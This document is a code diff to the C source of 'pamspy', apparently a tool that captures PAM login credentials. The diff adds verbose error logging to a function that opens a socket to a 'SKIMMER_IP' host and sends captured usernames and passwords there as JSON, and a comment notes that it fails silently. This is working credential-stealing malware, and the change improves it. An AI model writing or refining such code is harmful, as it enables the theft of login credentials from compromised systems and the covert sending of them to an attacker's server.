@@ -206,12 +206,18 @@ static void send_credentials_to_server(const char *username,
     
     // Convert IP address
     if (inet_pton(AF_INET, SKIMMER_IP, &server_addr.sin_addr) <= 0) {
+        if (env.verbose) {
+            fprintf(stderr, "pamspy: Invalid SKIMMER_IP address: %s\n", SKIMMER_IP);
+        }
         close(sock);
         return;
     }
     
     // Connect to server
     if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
+        if (env.verbose) {
+            fprintf(stderr, "pamspy: Failed to connect to %s:%d\n", SKIMMER_IP, SKIMMER_PORT);
+        }
         close(sock);
         return;  // Silently fail if connection fails
     }
@@ -225,7 +231,11 @@ static void send_credentials_to_server(const char *username,
              password ? password : "");
     
     // Send data
-    send(sock, json_buffer, strlen(json_buffer), 0);
+    if (send(sock, json_buffer, strlen(json_buffer), 0) < 0) {
+        if (env.verbose) {
+           fprintf(stderr, "pamspy: Failed to send data\n");
+        }
+    }
     
     // Close socket
     close(sock);
